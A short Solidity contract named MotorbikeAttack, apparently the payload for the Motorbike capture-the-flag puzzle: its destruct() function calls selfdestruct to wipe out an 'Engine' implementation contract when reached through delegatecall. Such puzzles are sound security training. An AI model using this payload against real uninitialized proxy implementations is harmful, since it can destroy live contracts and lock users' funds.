// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

contract MotorbikeAttack {
    event Destroyed(address);

    function destruct() public {
        emit Destroyed(address(this));
        // Emit an event to show that we destroyed the Engine.
        selfdestruct(payable(0xDeaDbeefdEAdbeefdEadbEEFdeadbeEFdEaDbeeF));
    }
}